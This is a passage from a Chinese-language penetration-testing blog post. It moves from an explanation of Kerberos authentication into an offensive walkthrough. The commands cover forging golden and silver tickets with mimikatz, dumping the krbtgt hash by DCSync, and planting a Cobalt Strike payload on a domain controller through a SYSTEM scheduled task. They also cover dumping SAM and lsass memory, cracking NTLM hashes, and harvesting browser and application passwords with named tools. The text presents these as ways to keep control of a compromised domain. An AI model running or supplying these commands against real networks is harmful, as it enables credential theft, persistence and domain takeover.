发起请求</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205145435423.png\" alt=\"image-20221205145435423\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端行为：</span><br><span class=\"line\">1、客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；</span><br><span class=\"line\">2、客户端将自己想要访问的Server服务以明文的方式发送给KDC；</span><br><span class=\"line\">3、客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；</span><br><span class=\"line\">TGS行为：</span><br><span class=\"line\">1、此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认证。</span><br><span class=\"line\">2、TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。</span><br><span class=\"line\">3、如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。</span><br><span class=\"line\">4、此时KDC将返回响应给客户端，响应内容包括：</span><br><span class=\"line\">第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信CS_SK（SessionKey）。</span><br><span class=\"line\">第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。</span><br><span class=\"line\">至此，第二次通信完成。</span><br></pre></td></tr></table></figure>\n<p><strong>通信第三步客户端和服务端进行通信</strong></p>\n<p>此时的客户端收到了来自 KDC（TGS）的响应，并使用缓存在本地的 CT_SK 解密了第二部分内容（第一部分内容中的 ST 是由 Server 密码加密的，客户端无法解密），检查时间戳无误后取出其中的 CS_SK 准备向服务端发起最后的请求。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205150740295.png\" alt=\"image-20221205150740295\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端：</span><br><span class=\"line\">1、客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。</span><br><span class=\"line\">服务端：</span><br><span class=\"line\">1、服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。</span><br><span class=\"line\">至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的</span><br><span class=\"line\">进行整个网络通信了。</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205151142934.png\" alt=\"image-20221205151142934\"></p>\n<h3 id=\"黄金票据\"><a class=\"markdownIt-Anchor\" href=\"#黄金票据\">#</a> 黄金票据</h3>\n<p><strong>权限维持的技术！！</strong></p>\n<p>krbtgt 用户，是系统在创建域时自动生成的一个帐号，其作用是密钥分发中心的服务账号，其密码是系统随机生成的，无法登录主机</p>\n<p>TGT=Krbtgt 的 html hash 加密</p>\n<p>1、Kerberos 中的 TGT 和 Logon Session Key（CT_SK）是 AS 返回的 ，TGP 它是由 Krbtgt 加密和签名的，krbtgt 的 NTLM Hash 又是固定的，而 CT_SK 并不会保存在 KDC 中。</p>\n<p>2、所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和 Logon Session Key（CT_SK）。</p>\n<p>3、Client 与 TGS 的交互中，而已有了金票后（TGT）, 就跳过 AS 验证，不用验证账户和密码，所以也不担心域管密码修改。</p>\n<p>当我们获得域控的控制权限后，有可能获取域内所有用户的 hash，和 krbtgt 的 hash。这时，由于一些原因导致我们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且 krbtgt 的密码没有更改，此时我们可以利用 krbtgt 用户的 ntlm hash 制作黄金票据伪造 TGT，重新获取域控的管理权限。</p>\n<p>实现前提</p>\n<p>1、已经控制了域名并且使用域管理员登录或者提权的 system</p>\n<p>如果域管理员发现了你控制了域控机器，把你的后门删除了，那么就不能继续控制域控了，这个时候当我们可以伪</p>\n<p>造 TGT 重新获得域控的权限</p>\n<p>条件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、域名称</span><br><span class=\"line\">2、域的SID值</span><br><span class=\"line\">3、域的KRBTGT账号的HASH</span><br><span class=\"line\">4、伪造任意用户名</span><br><span class=\"line\">（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class=\"line\">shell net config workstation 查看域</span><br></pre></td></tr></table></figure>\n<p>3、使用 mimikatz 导出 KRBTGT 的 ntlm hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz lsadump::dcsync /domain:hack.com /user:krbtgt</span><br></pre></td></tr></table></figure>\n<p>因为之前已经记录了关键信息，我们现在就可以伪造任意用户访问域控，windows 2008 机器必须是域内用户或者 system 用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::tgt 查票</span><br><span class=\"line\">mimikatz kerberos::purge 清票</span><br></pre></td></tr></table></figure>\n<p>使用计划任务上线 cs</p>\n<p>copy 恶意文件到域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell copy c:\\users\\administrator\\desktop\\artifact.exe \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p>设置计划任务到域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\\artifact.exe /ru system /f</span><br><span class=\"line\"></span><br><span class=\"line\">shell schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"白银票据\"><a class=\"markdownIt-Anchor\" href=\"#白银票据\">#</a> 白银票据</h3>\n<p>服务账号就是计算机名字 +$ 用来管理服务的账号</p>\n<p>如果说黄金票据是伪造的 TGT, 那么白银票据就是伪造的 ST。 在 Kerberos 认证的第三部，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3, 进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。所以我们只需要知道 Server 用户的 Hash 就可以伪造出一个 ST, 且不会经过 KDC, 但是伪造的门票只对部分服务起作用。</p>\n<p>条件如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.域名</span><br><span class=\"line\">2.域sid</span><br><span class=\"line\">3.目标服务器名</span><br><span class=\"line\">4.可利用的服务</span><br><span class=\"line\">5.服务账号的NTML HASH</span><br><span class=\"line\">6.需要伪造的用户名</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205180237718.png\" alt=\"image-20221205180237718\"></p>\n<p>3、伪造票据（CIFS 共享服务）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::logonpasswords</span><br><span class=\"line\">mimikatz kerberos::tgt 查票</span><br><span class=\"line\">mimikatz kerberos::purge 清票</span><br><span class=\"line\">shell klist 查票</span><br><span class=\"line\">shell klist purge 清票</span><br><span class=\"line\">mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:dc.hack.com /service:cifs /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt</span><br><span class=\"line\">mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:dc.hack.com /service:LDAP /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt</span><br><span class=\"line\">mimikatz lsadump::dcsync /dc:dc.hack.com /domain:hack.com /user:krbtgt</span><br></pre></td></tr></table></figure>\n<h3 id=\"sam文件密码抓取\"><a class=\"markdownIt-Anchor\" href=\"#sam文件密码抓取\">#</a> SAM 文件密码抓取</h3>\n<p>本地密码：</p>\n<p>1. 读 SAM 文件 (密文)</p>\n<p>2. 读 lsass 进程（明文）</p>\n<p><strong>Mimikatz 介绍</strong></p>\n<p>Mimikatz 是法国人 benjamin 开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够直接读取 WindowsXP-2012 等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，mimikatz 可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构建黄金票证</p>\n<p>几个常用的模块</p>\n<p>sekurlsa 模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">privilege模块</span><br><span class=\"line\">privilege::debug 提升为debug权限</span><br><span class=\"line\">sekurlsa：模块，从lsass进程中提取passwords、keys、pin、tickets等信息</span><br><span class=\"line\">sekurlsa::msv 获取HASH (LM,NTLM)</span><br><span class=\"line\">sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码</span><br><span class=\"line\">sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码</span><br><span class=\"line\">sekurlsa::tspkg 通过tspkg读取明文密码</span><br><span class=\"line\">sekurlsa::livessp 通过livessp 读取明文密码</span><br><span class=\"line\">sekurlsa::ssp 通过ssp 读取明文密码</span><br><span class=\"line\">sekurlsa::logonPasswords 通过以上各种方法读取明文密码</span><br><span class=\"line\">sekurlsa::process 将自己的进程切换到lsass进程中，之前只是注入读取信息</span><br><span class=\"line\">sekurlsa::minidump file 这个模块可以读取已经打包的内存信息</span><br><span class=\"line\">sekurlsa::pth 哈希传递</span><br><span class=\"line\">sekurlsa::pth /user:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx</span><br><span class=\"line\">sekurlsa::pth /user:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx</span><br></pre></td></tr></table></figure>\n<p>cs 中执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure>\n<p>或者 cs 中有内置 mimikatz 直接执行 logonPasswords</p>\n<p>process 模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process::list 列出进程列表</span><br><span class=\"line\">process::exports 导出进程列表</span><br><span class=\"line\">process::imports 导入列表</span><br><span class=\"line\">process::start 开始一个进程</span><br><span class=\"line\">process::stop 停止一个程序</span><br><span class=\"line\">process::suspend 冻结一个进程</span><br><span class=\"line\">process::resume 从冻结中恢复</span><br><span class=\"line\">process::run notepad 运行一个程序</span><br><span class=\"line\">process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口</span><br></pre></td></tr></table></figure>\n<p>kerberos 模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos::list 列出系统中的票据</span><br><span class=\"line\">kerberos::tgt 清除系统中的票据</span><br><span class=\"line\">kerberos::purge 导入票据到系统中</span><br><span class=\"line\">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>\n<p>常用命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CRYPTO::Certificates – 列出/导出凭证。</span><br><span class=\"line\">KERBEROS::Golden – 创建黄金票证/白银票证/信任票证。</span><br><span class=\"line\">KERBEROS::List – 列出在用户的内存中所有用户的票证（TGT 和 TGS）。</span><br><span class=\"line\">KERBEROS::PTT – 票证传递。</span><br><span class=\"line\">LSADUMP::DCSync – 向 DC 发起同步一个对象（获取帐户的密码数据）的质询。</span><br><span class=\"line\">LSADUMP::LSA – 向 LSA Server 质询检索 SAM/AD 的数据（正常或未打补丁的情况下）。可以从 DC 或者是一个lsass.dmp的转储文件中导出所有的Active Directory 域凭证数据。同样也可以获取指定帐户的凭证，如 krbtgt 帐户，使用 /name 参数，如：“/name:krbtgt”。</span><br><span class=\"line\">LSADUMP::SAM ‐ 获取 SysKey 来解密 SAM 的项目数据（从注册表或者 hive 中导出）SAM 选项。可以连接到本地安全帐户管理器（SAM）数据库中并能转储本地帐户的凭证。可以用来转储在 Windows 计算机上的所有的本地凭据。</span><br><span class=\"line\">LSADUMP::Trust ‐ 向 LSA Server 质询来获取信任的认证信息（正常或未打补丁的情况下）为所有相关的受信的域或林转储信任密钥（密码）</span><br><span class=\"line\">MISC::AddSid – 将用户帐户添加到 SID 历史记录。第一个值是目标帐户，第二值是帐户/组名（可以是多个或 SID）。</span><br><span class=\"line\">MISC::MemSSP – 注入恶意的 Wndows SSP 来记录本地身份验证凭据。</span><br><span class=\"line\">MISC::Skeleton – 在 DC 中注入万能钥匙（Skeleton Key） 到 LSASS 进程中。这使得所有用户所。使用的万能钥匙修补 DC 使用 “主密码” （又名万能钥匙）以及他们自己通常使用的密码进行身份验证。</span><br><span class=\"line\">PRIVILEGE::Debug – 获得 Debug 权限（很多 Mimikatz 命令需要 Debug 权限或本地 SYSTEM 权限）。</span><br><span class=\"line\">SEKURLSA::Ekeys – 列出 Kerberos 密钥</span><br><span class=\"line\">SEKURLSA::Kerberos – 列出所有已通过认证的用户的 Kerberos 凭证（包括服务帐户和计算机帐户）。</span><br><span class=\"line\">SEKURLSA::Krbtgt – 获取域中 Kerberos 服务帐户（KRBTGT）的密码数据。</span><br><span class=\"line\">SEKURLSA::LogonPasswords – 列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的计算机的凭证。</span><br><span class=\"line\">SEKURLSA::Pth – Hash 传递 和 Key 传递（注：Over‐Pass‐the‐Hash 的实际过程就是传递了相关的 Key(s)）。</span><br><span class=\"line\">SEKURLSA::Tickets – 列出最近所有已经过身份验证的用户的可用的 Kerberos 票证，包括使用用户帐户的上下文运行的服务和本地计算机在AD 中的计算机帐户。与 kerberos::list 不同的是 sekurlsa 使用内存读取的方式，它不会受到密钥导出的限制。</span><br><span class=\"line\">TOKEN::List – 列出系统中的所有令牌。</span><br><span class=\"line\">TOKEN::Elevate – 假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。</span><br><span class=\"line\">TOKEN::Elevate /domainadmin – 假冒一个拥有域管理员凭证的令牌。</span><br></pre></td></tr></table></figure>\n<h4 id=\"sam文件抓取密码\"><a class=\"markdownIt-Anchor\" href=\"#sam文件抓取密码\">#</a> SAM 文件抓取密码</h4>\n<p><strong>导出 sam 和 system 文件</strong></p>\n<p>1. 通过 reg 命令无工具导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg save hklm\\sam sam.hive</span><br><span class=\"line\">reg save hklm\\system system.hive</span><br></pre></td></tr></table></figure>\n<p>2、通过 nishang 中的 Copy-VSS 进行复制，如果这个脚本运行在了 DC 服务器上，ntds.dit 和 SYSTEM hive 也能被拷贝出来 (或者 cs 也行)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy‐vss //直接将文件保存在当前目录下</span><br><span class=\"line\">copy‐vss ‐DestinationDir 路径 //指定保存文件的路径（必须是已经存在的路径）</span><br></pre></td></tr></table></figure>\n<p>3.<strong> 读取 sam 和 system 文件获取密码</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure>\n<h4 id=\"在线读取samlsass文件\"><a class=\"markdownIt-Anchor\" href=\"#在线读取samlsass文件\">#</a> 在线读取 sam,lsass 文件</h4>\n<p>使用 mimikatz 在线读取 sam 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">分开的命令如下</span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\">token:elevate</span><br><span class=\"line\">lsadump::sam</span><br><span class=\"line\">连起来</span><br><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n<p>在线读取 lassa 文件</p>\n<p>从 lsass 进程中提取 passwords、keys、pin、tickets 等信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::msv 获取HASH (LM,NTLM)</span><br><span class=\"line\">sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码</span><br><span class=\"line\">sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码</span><br><span class=\"line\">sekurlsa::tspkg 通过tspkg读取明文密码</span><br><span class=\"line\">sekurlsa::livessp 通过livessp 读取明文密码</span><br><span class=\"line\">sekurlsa::ssp 通过ssp 读取明文密码</span><br><span class=\"line\">sekurlsa::logonPasswords 通过以上各种方法读取明文密码</span><br></pre></td></tr></table></figure>\n<h4 id=\"离线读取\"><a class=\"markdownIt-Anchor\" href=\"#离线读取\">#</a> 离线读取</h4>\n<p>1. 导出 lsass 文件</p>\n<p>1、使用任务管理器导出（windows NT 6）需要有远程桌面</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206170800142.png\" alt=\"image-20221206170800142\"></p>\n<p>2. 使用 procdump 导出 lsass.dmp 文件</p>\n<p>ProcDump 是一个命令行实用工具，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转储的应用程序。 ProcDump 还包括使用窗口挂起 (使用相同的窗口挂起定义，Windows 任务管理器使用) 、未经处理的异常监视，并且可以根据系统性能计数器的值生成转储。 它还可用作可在其他脚本中嵌入的常规进程转储实用工具。因为是微软的所以一般不会被杀软杀掉</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">procdump.exe ‐accepteula ‐ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>\n<p>3. 使用 PowerSploit 的 Out-MiniDump 模块，PowerSploit 是一个基于 Powershell 的渗透工具包，可以选择创建进程的完整内存转储。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL21hc3Rlci9FeGZpbHRyYXRpb24vT3V0LU1pbmlkdW1wLnBzMQ==\">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</span></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206171322063.png\" alt=\"image-20221206171322063\"></p>\n<p>4.comsvcs.dll，系统自带。通过 comsvcs.dll 的导出函数 MiniDump 实现 dump 内存</p>\n<p>首先查看 lsass.exe 进程 PID: tasklist | findstr lsass.exe</p>\n<p>使用 powershell 导出 rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 488 C:\\lsass.dmp full</p>\n<p>读取 dump 文件</p>\n<p>mimikatz.exe “sekurlsa::minidump lsass.dmp” “sekurlsa::logonPasswords full”</p>\n<h3 id=\"使用hashcat\"><a class=\"markdownIt-Anchor\" href=\"#使用hashcat\">#</a> 使用 hashcat</h3>\n<p>Hashcat 是一个密码恢复工具。直到 2015 年，它都有一个专有的代码库，但随后作为开源软件发布。版本适用于 Linux、OS X 和 Windows。哈希卡支持的哈希算法的示例包括 LM 哈希、MD4、MD5、SHA 系列和 Unix Crypt 格式，以及 MySQL 和 Cisco PIX 中使用的算法。</p>\n<p>下载地址： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXNoY2F0Lm5ldC9oYXNoY2F0Lw==\">https://hashcat.net/hashcat/</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat ‐m 1000 NTLM HASH 字典 ‐‐force</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NtZDUuY29t\">cmd5.com</span></p>\n<h3 id=\"浏览器-数据库等其他密码的抓取\"><a class=\"markdownIt-Anchor\" href=\"#浏览器-数据库等其他密码的抓取\">#</a> <strong>浏览器、数据库等其他密码的抓取</strong></h3>\n<p><strong>BrowserGhost 浏览器抓取</strong></p>\n<p>这是一个抓取浏览器密码的工具，后续会添加更多功能，已经完成的功能如下：实现 system 抓机器上其他用户的浏览器密码 (方便横向移动时快速凭据采集)</p>\n<p>用.net2 实现可兼容大部分 windows，并去掉依赖 (不需要 System.Data.SQLite.dll 这些累赘) 可以解密 chrome 全版本密码 (chrome80 版本后加密方式变了)</p>\n<p>Chrome 已经可以获取 login data、cookie、history、book 了</p>\n<p>BrowserGhost.exe</p>\n<p><strong>Sharp-HackBrowserData 浏览器</strong></p>\n<p>Sharp-HackBrowserData ，谷歌、火狐、IE、Vivaldi 等常见的浏览器都能抓</p>\n<p>Sharp-HackBrowserData.exe</p>\n<p><strong>SharpDecryptPwd 数据库</strong></p>\n<p>SharpDecryptPwd-master 对密码已保存在 Windwos 系统上的部分程序进行解析，包 Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SharpDecryptPwd.exe ‐TeamViewer</span><br><span class=\"line\">SharpDecryptPwd.exe ‐FileZilla</span><br><span class=\"line\">SharpDecryptPwd.exe ‐WinSCP</span><br><span class=\"line\">SharpDecryptPwd.exe ‐Xmangager ‐p Session_Path</span><br></pre></td></tr></table></figure>\n<p><strong>LaZagne 各类密码</strong></p>\n<p>是⽤于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明⽂、API、⾃定义算法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这些密码。</p>\n<p>命令：laZagne.exe all</p>\n<h3 id=\"抓取ntlm-hash\"><a class=\"markdownIt-Anchor\" href=\"#抓取ntlm-hash\">#</a> 抓取 ntlm hash</h3>\n<p><strong>getpassword</strong></p>\n<p>打开 GetPass 工具所在的目录。打开命令行环境。运行 64 位程 GetPassword。运行该程序后，即可获得明文密码</p>\n<p><strong>pwdump7</strong></p>\n<p>在命令行环境中运行 PwDump7 程序，可以得到系统中所有账户的 NTLMHash</p>\n<p><strong>QuarksPwDump</strong></p>\n<p>下载 QuarksPwDump.exe, 在命令行环境中输人 QuarksPwDump.exe --dump-hash-local 导出三个用户的 NLMHash</p>\n<p><strong>nishang</strong></p>\n<p>nishang 中的 GET-PASSHashes.ps1 可以可以获取 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import‐Module .\\Get‐PassHashes.ps1</span><br><span class=\"line\">Get‐PassHashes</span><br></pre></td></tr></table></figure>\n<p><strong>wce</strong></p>\n<p>这款工具是一款 Hash 注入神器，不仅可以用于 Hash 注入，也可以直接获取明文或 Hash。这款工具也分为 32 位和</p>\n<p>64 位两个不同的版本：</p>\n<h3 id=\"windows-rdp凭证的抓取和密码破解\"><a class=\"markdownIt-Anchor\" href=\"#windows-rdp凭证的抓取和密码破解\">#</a> <strong>Windows RDP 凭证的抓取和密码破解</strong></h3>\n<p>Credentials 的解密是 Windows 系统信息收集中非常重要的一环，其中包括各类敏感、重要的凭证（这个可以理解为密码），接下来我们就讲解 RDP 凭证的抓取和破解</p>\n<p>在我们点击保存密码后，Windows 就通过 MasterKey 将我们的密码加密后保存在本地，由于 Windows 还需要解密从而使用，所以这个过程是可逆，也正因为这一缘由，我们只要拿到 MasterKey 就能将密码解出来</p>\n<p>查看凭证命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看mstsc的连接记录</span><br><span class=\"line\">cmdkey /list</span><br><span class=\"line\">查找本地的Credentials</span><br><span class=\"line\">dir /a %userprofile%\\appdata\\local\\microsoft\\credentials\\*</span><br></pre></td></tr></table></figure>\n<p><img 